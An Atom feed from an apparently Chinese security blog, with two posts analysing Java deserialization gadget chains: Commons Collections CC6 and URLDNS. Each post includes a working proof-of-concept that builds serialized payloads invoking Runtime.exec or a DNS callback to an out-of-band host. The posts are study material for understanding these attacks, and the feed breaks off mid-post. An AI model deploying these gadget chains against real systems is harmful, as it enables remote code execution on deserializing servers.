<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gu0f3n&#39;s blog</title>
  
  <subtitle>邮电部诗人</subtitle>
  <link href="https://gu0f3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://gu0f3n.github.io/"/>
  <updated>2025-03-24T12:11:04.093Z</updated>
  <id>https://gu0f3n.github.io/</id>
  
  <author>
    <name>Gu0f3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>cc6</title>
    <link href="https://gu0f3n.github.io/2025/03/24/cc6/"/>
    <id>https://gu0f3n.github.io/2025/03/24/cc6/</id>
    <published>2025-03-24T11:21:15.000Z</published>
    <updated>2025-03-24T12:11:04.093Z</updated>
    
    <content type="html"><![CDATA[<p>   之前复现了java cc1链子 </p><p>顺便在这进行一个总结</p><h4 id="核心武器：反射万能钥匙（InvokerTransformer）"><a href="#核心武器：反射万能钥匙（InvokerTransformer）" class="headerlink" title="核心武器：反射万能钥匙（InvokerTransformer）"></a><strong>核心武器：反射万能钥匙（<code>InvokerTransformer</code>）</strong></h4><p><strong>比喻</strong>：<code>InvokerTransformer</code>类像一把万能钥匙，能通过反射调用任何方法。比如用钥匙打开“Runtime类”的锁，执行<code>exec(&quot;calc&quot;)</code>弹计算器</p><h4 id="流水线组装：串联工具人（ChainedTransformer）"><a href="#流水线组装：串联工具人（ChainedTransformer）" class="headerlink" title="流水线组装：串联工具人（ChainedTransformer）"></a><strong>流水线组装：串联工具人（<code>ChainedTransformer</code>）</strong></h4><p><strong>比喻</strong>：为了绕过限制，攻击者需要多个“工具人”协作。<code>ChainedTransformer</code>就像一个流水线，把多个操作串联起来：</p><p>工具人A：先拿到<code>Runtime</code>对象（<code>ConstantTransformer</code></p><p>工具人B：用万能钥匙调用<code>exec</code>方法（<code>InvokerTransformer</code>）</p><p><strong>原理</strong>：把这两个工具人按顺序放进<code>ChainedTransformer</code>，执行时会先获取<code>Runtime</code>对象，再调用<code>exec</code>方法。</p><h4 id="触发机关：改造地图（TransformedMap）"><a href="#触发机关：改造地图（TransformedMap）" class="headerlink" title="触发机关：改造地图（TransformedMap）"></a><strong>触发机关：改造地图（<code>TransformedMap</code>）</strong></h4><p><strong>比喻</strong>：<code>TransformedMap</code>是一个被魔改的地图，当地图中的值被修改时（比如调用<code>setValue</code>），会自动触发流水线上的工具人</p><h4 id="点火开关：反序列化入口（AnnotationInvocationHandler）"><a href="#点火开关：反序列化入口（AnnotationInvocationHandler）" class="headerlink" title="点火开关：反序列化入口（AnnotationInvocationHandler）"></a><strong>点火开关：反序列化入口（<code>AnnotationInvocationHandler</code>）</strong></h4><p><strong>比喻</strong>：<code>AnnotationInvocationHandler</code>是Java自带的“快递拆包员”，反序列化时会自动执行<code>readObject</code>方法（拆包裹逻辑）。攻击者把魔改地图塞进它的<code>memberValues</code>属性</p><p><strong>触发流程</strong>：</p><p>反序列化时，<code>readObject</code>方法遍历地图中的键值对</p><p>遍历到某个键值对时，调用<code>setValue</code>修改值，触发魔改地图的机关</p><ul><li>机关启动流水线工具人，最终弹计算器。</li></ul><h3 id="高版本jdk的修改"><a href="#高版本jdk的修改" class="headerlink" title="高版本jdk的修改"></a>高版本jdk的修改</h3><p>在jdk8u_71之后，AnnotationInvocationHandler类被重写了，修改了readObject方法，里面没有了setValue方法。</p><p>通过</p><p>ChainedTransformer的transform方法的用法，定位到LazyMap的get方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逻辑 </p><p>检查键是否存在，不存在时创建值并存储，存在时直接返回。</p><p>接着寻找入口点</p><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TiedMapEntry的hashCode方法调用了getValue，getValue调用了get方法，所以可以用TiedMapEntry的hashCode方法调用LazyMap的get方法</p><p>接下来寻找谁调用了hashCode方法</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>通过之前对<a href="https://mp.weixin.qq.com/s/yby-SU4vfxPQFJdBS2TMtQ">URLDNS链</a>的研究可知，HashMap的readObject方法有如下这行语句</p><p>putVal(hash(key), key, value, false, false);</p><p>而HashMap的hash方法调用了hashCode方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而key的值是从readObject获取的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br></pre></td></tr></table></figure><p>序列化时可以用HashMap的put方法传key和value</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashMap.put(tiedMapEntry, <span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是hashmap的put会提前走完流程 </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于HashMap的put方法会导致提前调用hash方法，从而在序列化前就命令执行，所以这里修改一下代码。</p><p>这里选择在新建LazyMap对象的时候，随便传入一个Transformer对象，等put完之后再通过反射修改回ChainedTransformer对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>)); <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>); HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br></pre></td></tr></table></figure><p>反射修改lazymap的factory的值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class; <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>); factoryField.setAccessible(<span class="literal">true</span>); factoryField.set(lazymap, ct);</span><br></pre></td></tr></table></figure><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">    TiedMapEntry.hashCode()</span><br><span class="line">    TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">                InvokerTransformer.transform()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazymap, ct);</span><br><span class="line"></span><br><span class="line">        serial(hashMap);</span><br><span class="line">        unserial();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serial</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6.bin&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;   之前复现了java cc1链子 &lt;/p&gt;
&lt;p&gt;顺便在这进行一个总结&lt;/p&gt;
&lt;h4 id=&quot;核心武器：反射万能钥匙（InvokerTransformer）&quot;&gt;&lt;a href=&quot;#核心武器：反射万能钥匙（InvokerTransformer）&quot; class=&quot;head</summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>URLDNS</title>
    <link href="https://gu0f3n.github.io/2025/03/23/URLDNS/"/>
    <id>https://gu0f3n.github.io/2025/03/23/URLDNS/</id>
    <published>2025-03-23T08:02:24.000Z</published>
    <updated>2025-03-23T09:00:44.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLDNS-链子分析"><a href="#URLDNS-链子分析" class="headerlink" title="URLDNS 链子分析"></a>URLDNS 链子分析</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure><p>原理：</p><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><p>在利用yso生成链子的时候先从GeneratPayload.class触发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.ObjectPayload.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GeneratePayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">INTERNAL_ERROR_CODE</span> <span class="operator">=</span> <span class="number">70</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">USAGE_CODE</span> <span class="operator">=</span> <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GeneratePayload</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length != <span class="number">2</span>) &#123;</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payloadType</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">ObjectPayload</span>&gt; payloadClass = Utils.getPayloadClass(payloadType);</span><br><span class="line">        <span class="keyword">if</span> (payloadClass == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Invalid payload type &#x27;&quot;</span> + payloadType + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">            printUsage();</span><br><span class="line">            System.exit(<span class="number">64</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectPayload</span> <span class="variable">payload</span> <span class="operator">=</span> (ObjectPayload)payloadClass.newInstance();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> payload.getObject(command);</span><br><span class="line">                <span class="type">PrintStream</span> <span class="variable">out</span> <span class="operator">=</span> System.out;</span><br><span class="line">                Serializer.serialize(object, out);</span><br><span class="line">                Utils.releasePayload(payload, object);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">                System.err.println(<span class="string">&quot;Error while generating or serializing payload&quot;</span>);</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                System.exit(<span class="number">70</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>然后add添加之后，调用新实例化对象的getObject方法,后面调试跳到了URLDNS.java，且实现了ObjectPayload接口，里面也确实有getObject方法：</p><p>重点代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();<span class="comment">//创建一个返回URLStreamHandler名为handler的实例SilentURLStreamHandler()</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();<span class="comment">//创建一个返回HashMap名为ht的实例HashMap()</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>((URL)<span class="literal">null</span>, url, handler);<span class="comment">//创建一个返回URL名字为u的实力URL,并且使用指定构造函数URL(URL context, String spec, URLStreamHandler handler)</span></span><br><span class="line">ht.put(u, url);<span class="comment">//这一行将 URL 对象 u 和对应的 url 字符串存入 HashMap ht</span></span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);<span class="comment">//这一行通过反射机制将 URL 对象 u 的 hashCode 字段值设置为 -1（因为 -1 通常表示未初始化的状态）</span></span><br><span class="line"><span class="keyword">return</span> ht;<span class="comment">//返回值ht</span></span><br></pre></td></tr></table></figure><p>URLStreamHandler 是 Java 中的一个抽象类，用于处理 URL 的协议部分，例如 HTTP、HTTPS、FTP 等。</p><p>HashMap 是 Java 中的一种集合类，属于 java.util 包，用于存储键值对（key-value pairs）。</p><p>在这里，ht 是一个空的 HashMap，后续将被用来存储 URL 对象和对应的 URL 字符串。</p><p>Reflections 可能是一个工具类（例如来自某个库，如 org.reflections），用于简化 Java 反射操作。它的 setFieldValue 方法通过反射修改对象的字段值。</p><p>在 Java 的 URL 类中，hashCode 是一个私有字段，用于缓存该 URL 的哈希码。URL 类的 hashCode() 方法会计算并缓存这个值，以便在集合操作（如 HashMap 的键比较）中快速使用。</p><p>将 hashCode 设置为 -1 的目的可能是：</p><ul><li>强制 URL 对象在下次调用 hashCode() 时重新计算哈希码（因为 -1 通常表示未初始化的状态）。</li></ul><p>hashcode计算，判断如果不是-1，则直接返回，表示已经算过了，是-1则继续计算；还有需要注意的这个接口中：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">//这个URL传输实现类是一个transient临时类型，它不会被反序列化 </span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="variable">hashCode</span> <span class="operator">=</span> -<span class="number">1</span>;<span class="comment">//hashCode是private类型，需要手动开放控制权才可以修改。</span></span><br></pre></td></tr></table></figure><p>首先调用HashMap的put方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会通过hash函数调用<code>key.hashCode()</code>计算key的hashCode;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>key是传入的URL对象，最终调用URL对象的hashCode函数，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>handler</code>是<code>URLStreamHandler</code>的对象；handler在构造函数时被赋值了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler</span><br></pre></td></tr></table></figure><p>接着调用了<code>URLStreamHandler.hashCode</code>中的<code>getHostAddress(u)</code>方法导致DNS解析</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line"><span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">    h += addr.hashCode();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">        h += host.toLowerCase().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcodefield.set(url,<span class="number">2</span>); <span class="comment">//为了防止在put时就发起DNS请求，将hashCode的默认值-1改掉，执行不了handler.hashCode(this)</span></span><br><span class="line"></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结 </p><p>形象的举个例子</p><h3 id="埋雷：构造一个带“陷阱”的快递（序列化）"><a href="#埋雷：构造一个带“陷阱”的快递（序列化）" class="headerlink" title="埋雷：构造一个带“陷阱”的快递（序列化）"></a><strong>埋雷：构造一个带“陷阱”的快递（序列化）</strong></h3><ul><li><strong>陷阱核心</strong>：把URL对象（比如<code>http://xxx.dnslog.cn</code>）塞进HashMap里当“钥匙”（Key），然后序列化这个HashMap。</li></ul><p><strong>防止提前触发</strong>：URL对象默认会立即查DNS，但黑客用反射修改<code>hashCode</code>属性为123（临时值），避免序列化时触发DNS</p><h3 id="寄快递：发送包裹到目标（传输数据）"><a href="#寄快递：发送包裹到目标（传输数据）" class="headerlink" title="寄快递：发送包裹到目标（传输数据）"></a><strong>寄快递：发送包裹到目标（传输数据）</strong></h3><ul><li><strong>数据伪装</strong>：序列化后的HashMap看起来是普通数据，被发送到目标服务器（比如通过接口、文件上传等途径）。</li></ul><h3 id="拆快递：目标拆包裹触发陷阱（反序列化）"><a href="#拆快递：目标拆包裹触发陷阱（反序列化）" class="headerlink" title="拆快递：目标拆包裹触发陷阱（反序列化）"></a><strong>拆快递：目标拆包裹触发陷阱（反序列化）</strong></h3><p><strong>自动拆包</strong>：服务器反序列化时，会调用HashMap的<code>readObject</code>方法，这是Java默认的反序列化逻辑。</p><p><strong>计算“钥匙”哈希值</strong>：</p><p>HashMap会重新计算每个Key的哈希值（<code>hash(key)</code>）</p><ul><li>此时Key是之前埋入的URL对象，于是调用URL的<code>hashCode()</code>方法。</li></ul><h3 id="查地址：触发DNS请求（核心利用）"><a href="#查地址：触发DNS请求（核心利用）" class="headerlink" 